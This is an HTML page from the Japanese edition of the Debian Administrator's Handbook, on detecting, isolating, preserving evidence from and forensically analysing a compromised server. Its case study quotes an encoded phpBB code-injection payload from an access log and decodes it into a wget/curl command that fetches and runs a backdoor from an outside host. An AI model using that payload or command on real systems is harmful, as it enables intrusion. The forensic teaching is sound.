@@ -1,0 +1,327 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html
+    xmlns="http://www.w3.org/1999/xhtml"><head><meta
+        http-equiv="Content-Type"
+        content="text/html; charset=UTF-8" /><title
+        xmlns:d="http://docbook.org/ns/docbook">14.6. 不正侵入されたマシンの取り扱い</title><link
+        rel="stylesheet"
+        type="text/css"
+        href="Common_Content/css/default.css" /><link
+        rel="stylesheet"
+        media="print"
+        href="Common_Content/css/print.css"
+        type="text/css" /><meta
+        xmlns:d="http://docbook.org/ns/docbook"
+        name="generator"
+        content="publican v4.3.1" /><meta
+        xmlns:d="http://docbook.org/ns/docbook"
+        name="package"
+        content="Debian-debian-handbook-8-ja-JP-1.0-1" /><meta
+        name="keywords"
+        content="ファイヤーウォール, Netfilter, IDS/NIDS" /><link
+        rel="home"
+        href="index.html"
+        title="Debian 管理者ハンドブック" /><link
+        rel="up"
+        href="security.html"
+        title="第14章 セキュリティ" /><link
+        rel="prev"
+        href="sect.other-security-considerations.html"
+        title="14.5. セキュリティ関連で他に考慮すべき点" /><link
+        rel="next"
+        href="debian-packaging.html"
+        title="第15章 Debian パッケージの作成" /><link
+        rel="canonical"
+        href="http://l.github.io/debian-handbook/html/ja-JP/sect.dealing-with-compromised-machine.html" /></head><body
+      class="draft "><noscript><iframe
+          src="//www.googletagmanager.com/ns.html?id=GTM-5H35QX"
+          height="0"
+          width="0"
+          style="display:none;visibility:hidden"></iframe></noscript><script
+        type="text/javascript">(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&amp;l='+l:'';j.async=true;j.src=
+'//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-5H35QX');</script><div
+        id="banner"><a
+          href="http://debian-handbook.info/get/"><span
+            class="text">Download the ebook</span></a></div><p
+        id="title"><a
+          class="left"
+          href="http://www.debian.org"><img
+            alt="Product Site"
+            src="Common_Content/images//image_left.png" /></a><a
+          class="right"
+          href="http://debian-handbook.info"><img
+            alt="Documentation Site"
+            src="Common_Content/images//image_right.png" /></a></p><ul
+        class="docnav top"><li
+          class="previous"><a
+            accesskey="p"
+            href="sect.other-security-considerations.html"><strong>戻る</strong></a></li><li
+          class="home">Debian 管理者ハンドブック</li><li
+          class="next"><a
+            accesskey="n"
+            href="debian-packaging.html"><strong>次へ</strong></a></li></ul><div
+        class="section"><div
+          class="titlepage"><div><div><h2
+                class="title"><a
+                  id="sect.dealing-with-compromised-machine"></a>14.6. 不正侵入されたマシンの取り扱い</h2></div></div></div><div
+          class="para">
+			最良の意志と注意深く設計されたセキュリティポリシーにも関わらず、結局のところ管理者は乗っ取りに直面します。この節では、不幸な状況に直面した場合にどのように対応するか、幾つかの指針を提供します。
+		</div><div
+          class="section"><div
+            class="titlepage"><div><div><h3
+                  class="title"><a
+                    id="idm140393304311808"></a>14.6.1. クラッカー不正侵入の検知と観察</h3></div></div></div><div
+            class="para">
+				クラッキング対応の最初の段階はこうした行為を把握する事です。クラッキング行為を、特に十分な監視設備が無い状態で、把握することは不可能です。
+			</div><div
+            class="para">
+				クラッキング行為は、クラッキング行為がマシンでホストされている正規のサービスに直接的な影響をもたらすまで、例えば接続が遅くなったり一部のユーザが接続不可能になったり様々な誤作動が起きるまで、検知されない事が多いです。これらの問題に直面したら、管理者はマシンをよく見て不正行為を注意深く調べる事が必要です。通常この時点で異常なプロセスが発見されます。例えば、標準的な <code
+              class="literal">/usr/sbin/apache2</code> の代わりに <code
+              class="literal">apache</code> と名付けられたプロセス等です。この例に従うなら、やるべきことはプロセス識別子を確認して、このプロセスが現在実行しているプログラムが何かを見るために <code
+              class="filename">/proc/<em
+                class="replaceable">pid</em>/exe</code> を確認する事です:
+			</div><pre
+            class="screen">
+<code
+              class="computeroutput"># </code><strong
+              class="userinput"><code>ls -al /proc/3719/exe</code></strong>
+<code
+              class="computeroutput">lrwxrwxrwx 1 www-data www-data 0 2007-04-20 16:19 /proc/3719/exe -&gt; /var/tmp/.bash_httpd/psybnc</code>
+</pre><div
+            class="para">
+				プログラムが <code
+              class="filename">/var/tmp/</code> の下にインストールされ、ウェブサーバの権限で実行している? 間違いありません。マシンは不正侵入されています。
+			</div><div
+            class="para">
+				これは一例に過ぎませんが、他にも管理者の注意を惹くような数多くの手掛かりが存在します:
+			</div><div
+            xmlns:d="http://docbook.org/ns/docbook"
+            class="itemizedlist"><ul><li
+                class="listitem"><div
+                  class="para">
+						動作しないコマンド; コマンドが要求するソフトウェアのバージョンが <code
+                    class="command">dpkg</code> によってインストールされたと考えられるバージョンと一致しません;
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						最後の接続元が別の大陸にある未知のサーバという事を示すコマンドプロンプトやセッション挨拶文;
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						<code
+                    class="filename">/tmp/</code> パーティションが満杯になったことによるエラー、大量の映画の不正コピーで一杯です;
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						などです。
+					</div></li></ul></div></div><div
+          class="section"><div
+            class="titlepage"><div><div><h3
+                  class="title"><a
+                    id="idm140393304299920"></a>14.6.2. サーバをオフラインにする</h3></div></div></div><div
+            class="para">
+				クラッキングが最も派手に行われる場合を除けば、クラッキングはネットワーク経由で行われ、攻撃者は目標 (機密データへのアクセス、不正ファイルの共有、踏み台としてマシンを使うことによる本人識別情報の隠匿、など) を達成するためにネットワークを必要とします。攻撃者がまだクラッキング行為を完了していない場合、ネットワークからコンピュータを切り離すことで、攻撃者は目標を達成できなくなります。
+			</div><div
+            class="para">
+				サーバが物理的にアクセス可能な場合のみ、これは可能です。サーバが物凄く遠くにあるホスティングプロバイダのデータセンターでホストされていたり、サーバにその他の理由でアクセスできない場合、幾つかの重要な情報の収集 (以下の説を参照) を開始して、可能な限り多くの (通常 <code
+              class="command">sshd</code> を除くすべての) サービスをシャットダウンすることで可能な限りサーバを隔離する、ことは通常良いアイディアです。これはまだ都合が悪い状態です。なぜなら、攻撃者は管理者がしているのと同様に SSH アクセス可能だからです; このため、マシンを「きれいに」することは難しいです。
+			</div></div><div
+          class="section"><div
+            class="titlepage"><div><div><h3
+                  class="title"><a
+                    id="idm140393304296576"></a>14.6.3. 証拠として使えるすべての保存</h3></div></div></div><div
+            class="para">
+				攻撃を理解したり、攻撃者に対して法的手段を取るには、すべての重要な要素の複製を取る事が必要です; これには、ハードディスクの内容、すべての実行中プロセスのリスト、すべての開かれた接続のリスト、が含まれます。RAM の内容を使う事も可能ですが、実際にこれが使われることはまれです。
+			</div><div
+            class="para">
+				作業中に、管理者は不正侵入されたマシン上で数多くの事項を確認しようとします; これは良いアイディアではありません。すべてのコマンドは潜在的に破壊されており、様々な証拠を消してしまいます。確認は最低限 (ネットワーク接続状態を確認する <code
+              class="command">netstat -tupan</code>、プロセスのリストを確認する <code
+              class="command">ps auxf</code>、実行中プログラムのより詳しい情報を確認する <code
+              class="command">ls -alR /proc/[0-9]*</code>) に留めるべきです。そして、すべての確認作業を注意深く記録するべきです。
+			</div><div
+            class="sidebar"><div
+              class="titlepage"><div><div><p
+                    class="title"><strong><span
+                        class="emphasis"><em>CAUTION</em></span> その場解析</strong></p></div></div></div><div
+              class="para">
+				特にサーバが物理的に到達できない場合、起動中のシステムを解析したいと思うかもしれませんが、これは特に避けるべきです: これは特に単純に言って、不正侵入されたシステムに現在インストールされているプログラムを信頼できないからです。破壊された <code
+                class="command">ps</code> コマンドを使えば一部のプロセスを非表示にしたり、破壊された <code
+                class="command">ls</code> を使えば一部のファイルを非表示にする事が可能です。場合によってはカーネルに不正侵入されることすらあるのです!
+			</div><div
+              class="para">
+				これでもまだその場解析が必要な場合、既知の良好なプログラムだけを使うように注意するべきです。これを行う良い方法は、破壊されていないプログラムを備えたレスキュー CD または読み込み専用のネットワーク共有を使う事です。しかしながら、カーネル自身が不正侵入されている場合、これらの対策では不十分です。
+			</div></div><div
+            class="para">
+				「動的な」要素の保存が完了したら、次にハードディスクの完全なイメージを保存します。ファイルシステムの内容が書き変わっている間はそのようなイメージを作ることは不可能です。そのため、ファイルシステムを読み込み専用で再マウントする必要があります。最も簡単な解決策として、(<code
+              class="command">sync</code> を実行した後) サーバを無理矢理停止し、レスキュー CD を使って再起動する事がよく行われます。各パーティションは <code
+              class="command">dd</code> などのツールを使ってコピーされるべきです; これらのイメージを他のサーバに送信する事が可能です (場合によってはとても便利な <code
+              class="command">nc</code> ツールを使って送信します)。他のより簡単な方法もあります: 不正侵入されたマシンからディスクを取り出して、再フォーマットおよび再インストールしても問題ない新しいディスクで置き換えます。
+			</div></div><div
+          class="section"><div
+            class="titlepage"><div><div><h3
+                  class="title"><a
+                    id="idm140393304286592"></a>14.6.4. 再インストール</h3></div></div></div><a
+            id="idm140393304285952"
+            class="indexterm"></a><a
+            id="idm140393304285184"
+            class="indexterm"></a><div
+            class="para">
+				不正侵入されたサーバを、完全に再インストールする前に、オンラインに戻すべきではありません。不正侵入が深刻な場合 (管理者権限が奪われていた場合)、再インストール以外に攻撃者が残したすべて (特に<span
+              class="emphasis"><em>バックドア</em></span>) が一掃された事を保証する方法はほぼ存在しません。もちろん、攻撃者の使う脆弱性を塞ぐために、すべての最新のセキュリティ更新を適用しなければいけません。理想的に言えば、不正侵入の形跡を解析する事で、この最新のセキュリティ更新によって塞がれる脆弱性を使って不正侵入が行われた事が明らかになるべきです。そうすれば、実際に攻撃ベクトルが修正された事を保証する事が可能です; さもなければ、更新によって不正侵入の足掛かりとなった脆弱性が修正された事を期待することしかできません。
+			</div><div
+            class="para">
+				リモートサーバの再インストールは常に簡単というわけではありません; ホスティング会社の手助けが必要になる場合があります。なぜなら、ホスティング会社のすべてが自動再インストールシステムを提供しているとは限らないからです。不正侵入後に取られたバックアップからマシンを再インストールしないように注意してください。理想的に言えば、データだけを回復するべきです。実際のソフトウェアはインストールメディアから再インストールされるべきです。
+			</div></div><div
+          class="section"><div
+            class="titlepage"><div><div><h3
+                  class="title"><a
+                    id="idm140393304281456"></a>14.6.5. フォレンジック解析</h3></div></div></div><div
+            class="para">
+				サービスが回復したら、攻撃ベクトルを理解するために不正侵入されたシステムのディスクイメージの詳細な調査を開始します。これらのイメージをマウントする際に、<code
+              class="literal">ro,nodev,noexec,noatime</code> オプションを使うことに注意してください。これは (ファイルにアクセスしたタイムスタンプを含めて) 内容の変更を防ぎ、誤って破壊されたプログラムを実行する事を防ぐ意味合いがあります。
+			</div><div
+            class="para">
+				通常、攻撃シナリオを辿るには、変更されて実行されたすべてを探し出す事が必要です。
+			</div><div
+            xmlns:d="http://docbook.org/ns/docbook"
+            class="itemizedlist"><ul><li
+                class="listitem"><div
+                  class="para">
+						<code
+                    class="filename">.bash_history</code> ファイルには、極めて興味深い内容が含まれます;
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						最近作成、修正、アクセスされた listing ファイルも同様です;
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						<code
+                    class="command">strings</code> コマンドは攻撃者がインストールしたプログラムを識別する助けになります。このコマンドはバイナリからテキスト文字列を抽出します;
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						<code
+                    class="filename">/var/log/</code> 内のログファイルを使えば出来事の経過を辿る事が可能です;
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						特殊目的のツールを使うことで、潜在的に削除されたファイルの内容を復元する事が可能です。このファイルには攻撃者が削除したログファイルなどが含まれます。
+					</div></li></ul></div><div
+            class="para">
+				これらの操作は専用ソフトウェアを使うことで簡単に実行する事が可能です。特に、<span
+              class="emphasis"><em>The Coroner Toolkit</em></span> (<span
+              class="pkg pkg">tct</span> パッケージに含まれます) は専用ソフトウェアツール集です。<span
+              class="emphasis"><em>The Coroner Toolkit</em></span> には幾つかのツールが含まれます; 中でも、起動中の不正侵入されたシステムからデータを収集する事が可能な <code
+              class="command">grave-robber</code>、ディスクの未使用領域から興味深いデータを抽出する <code
+              class="command">lazarus</code>、プロセスが使っているメモリの複製を取る事が可能な <code
+              class="command">pcat</code> は注目に値します。他のデータ抽出ツールも含まれています。<a
+              id="idm140393304269344"
+              class="indexterm"></a>
+			</div><div
+            class="para">
+				<span
+              class="pkg pkg">sleuthkit</span> パッケージはファイルシステムを解析する別のツールを提供します。これは <span
+              class="emphasis"><em>Autopsy Forensic Browser</em></span> グラフィカルインターフェース (<span
+              class="pkg pkg">autopsy</span> パッケージに含まれます) から簡単に使う事が可能です。<a
+              id="idm140393304266592"
+              class="indexterm"></a>
+			</div></div><div
+          class="section"><div
+            class="titlepage"><div><div><h3
+                  class="title"><a
+                    id="idm140393304265824"></a>14.6.6. 攻撃シナリオの再構成</h3></div></div></div><div
+            class="para">
+				解析中に収集されたすべての要素はジグソーパズルのピースの如く組み合わさるべきです; 最初の疑わしいファイルの作成は破壊を証明するログと関係があります。実世界の例は長ったらしい理論よりもより明白であるべきです。
+			</div><div
+            class="para">
+				以下のログは Apache <code
+              class="filename">access.log</code> から抽出したものです:
+			</div><pre
+            class="programlisting">
+www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] "GET /phpbb/viewtopic.php?t=10&amp;highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(32)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(124)%252echr(124)%252echr(32)%252echr(99)%252echr(117)%252echr(114)%252echr(108)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(45)%252echr(111)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(99)%252echr(104)%252echr(109)%252echr(111)%252echr(100)%252echr(32)%252echr(43)%252echr(120)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(46)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(38))%252e%2527 HTTP/1.1" 200 27969 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
+</pre><div
+            class="para">
+				これは phpBB の古いセキュリティ脆弱性を突いた例です。<div
+              class="url">→ <a
+                href="http://secunia.com/advisories/13239/">http://secunia.com/advisories/13239/</a></div> <div
+              class="url">→ <a
+                href="http://www.phpbb.com/phpBB/viewtopic.php?t=240636">http://www.phpbb.com/phpBB/viewtopic.php?t=240636</a></div>
+			</div><div
+            class="para">
+				長い URL を復号することで、攻撃者が幾つかの PHP コードを実行しようと試みた事が理解できます。はっきり言うと: <code
+              class="command">system("cd /tmp; wget gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd; chmod +x bd; ./bd &amp;")</code> です。確かに、<code
+              class="filename">bd</code> ファイルが <code
+              class="filename">/tmp/</code> の中で見つかりました。<code
+              class="command">strings /mnt/tmp/bd</code> を実行したところ、他の文字列に混じって、<code
+              class="literal">PsychoPhobia Backdoor is starting...</code> が返されました。これはまさにバックドアのように見えます。
+			</div><div
+            class="para">
+				暫くの後、このアクセスは地下 IRC ネットワークに接続する IRC <span
+              class="emphasis"><em>ボット</em></span>をダウンロード、インストール、実行するために使われました。このボットは IRC プロトコルを介して制御され、共有するファイルをダウンロードする指示を与えられました。このプログラムは自分自身のログファイルを持っています:
+			</div><pre
+            class="programlisting">** 2004-11-29-19:50:15: NOTICE: :GAB!sex@Rizon-2EDFBC28.pool8250.interbusiness.it NOTICE ReV|DivXNeW|504 :DCC Chat (82.50.72.202)
+** 2004-11-29-19:50:15: DCC CHAT attempt authorized from GAB!SEX@RIZON-2EDFBC28.POOL8250.INTERBUSINESS.IT
+** 2004-11-29-19:50:15: DCC CHAT received from GAB, attempting connection to 82.50.72.202:1024
+** 2004-11-29-19:50:15: DCC CHAT connection suceeded, authenticating
+** 2004-11-29-19:50:20: DCC CHAT Correct password
+(...)
+** 2004-11-29-19:50:49: DCC Send Accepted from ReV|DivXNeW|502: In.Ostaggio-iTa.Oper_-DvdScr.avi (713034KB)
+(...)
+** 2004-11-29-20:10:11: DCC Send Accepted from GAB: La_tela_dell_assassino.avi (666615KB)
+(...)
+** 2004-11-29-21:10:36: DCC Upload: Transfer Completed (666615 KB, 1 hr 24 sec, 183.9 KB/sec)
+(...)
+** 2004-11-29-22:18:57: DCC Upload: Transfer Completed (713034 KB, 2 hr 28 min 7 sec, 80.2 KB/sec)</pre><div
+            class="para">
+				ログに残された痕跡によれば、82.50.72.202 IP アドレスを経由して 2 つのビデオファイルがサーバ上に保存された事が判ります。
+			</div><div
+            class="para">
+				並行して、攻撃者はさらにファイルをダウンロードしました。<code
+              class="filename">/tmp/pt</code> と <code
+              class="filename">/tmp/loginx</code> です。<code
+              class="command">strings</code> を介してこれらのファイルを調べると、<span
+              class="foreignphrase"><em
+                class="foreignphrase">Shellcode placed at 0x%08lx</em></span> や <span
+              class="foreignphrase"><em
+                class="foreignphrase">Now wait for suid shell...</em></span> などの文字列が見つかりました。プログラムは管理者権限を取得するためにローカルの脆弱性を不正利用しているように見えます。攻撃者は目標を達成したでしょうか? この場合、おそらくまだでしょう。なぜなら、最初の破壊行為の後どのファイルも修正されていなかったからです。
+			</div><div
+            class="para">
+				この例では、不正侵入のすべてが再構成されました。そして、攻撃者は不正侵入されたシステムを 3 日間に渡って悪用する事ができたと推測する事が可能です; しかし、解析で明らかになった最も重要な要素は脆弱性の内容です。管理者は新規インストールによって完全にこの種の脆弱性が修正された事を保証する事が可能です。
+			</div></div></div><ul
+        class="docnav"><li
+          class="previous"><a
+            accesskey="p"
+            href="sect.other-security-considerations.html"><strong>戻る</strong>14.5. セキュリティ関連で他に考慮すべき点</a></li><li
+          class="up"><a
+            accesskey="u"
+            href="#"><strong>上に戻る</strong></a></li><li
+          class="home"><a
+            accesskey="h"
+            href="index.html"><strong>ホーム</strong></a></li><li
+          class="next"><a
+            accesskey="n"
+            href="debian-packaging.html"><strong>次へ</strong>第15章 Debian パッケージの作成</a></li></ul><div
+        id="translated_pages"><ul><li><a
+              href="../ar-MA/sect.dealing-with-compromised-machine.html">ar-MA</a></li><li><a
+              href="../da-DK/sect.dealing-with-compromised-machine.html">da-DK</a></li><li><a
+              href="../de-DE/sect.dealing-with-compromised-machine.html">de-DE</a></li><li><a
+              href="../el-GR/sect.dealing-with-compromised-machine.html">el-GR</a></li><li><a
+              href="../en-US/sect.dealing-with-compromised-machine.html">en-US</a></li><li><a
+              href="../es-ES/sect.dealing-with-compromised-machine.html">es-ES</a></li><li><a
+              href="../fa-IR/sect.dealing-with-compromised-machine.html">fa-IR</a></li><li><a
+              href="../fr-FR/sect.dealing-with-compromised-machine.html">fr-FR</a></li><li><a
+              href="../hr-HR/sect.dealing-with-compromised-machine.html">hr-HR</a></li><li><a
+              href="../id-ID/sect.dealing-with-compromised-machine.html">id-ID</a></li><li><a
+              href="../it-IT/sect.dealing-with-compromised-machine.html">it-IT</a></li><li><a
+              href="../ja-JP/sect.dealing-with-compromised-machine.html">ja-JP</a></li><li><a
+              href="../pl-PL/sect.dealing-with-compromised-machine.html">pl-PL</a></li><li><a
+              href="../pt-BR/sect.dealing-with-compromised-machine.html">pt-BR</a></li><li><a
+              href="../ro-RO/sect.dealing-with-compromised-machine.html">ro-RO</a></li><li><a
+              href="../ru-RU/sect.dealing-with-compromised-machine.html">ru-RU</a></li><li><a
+              href="../tr-TR/sect.dealing-with-compromised-machine.html">tr-TR</a></li><li><a
+              href="../zh-CN/sect.dealing-with-compromised-machine.html">zh-CN</a></li></ul></div></body></html>
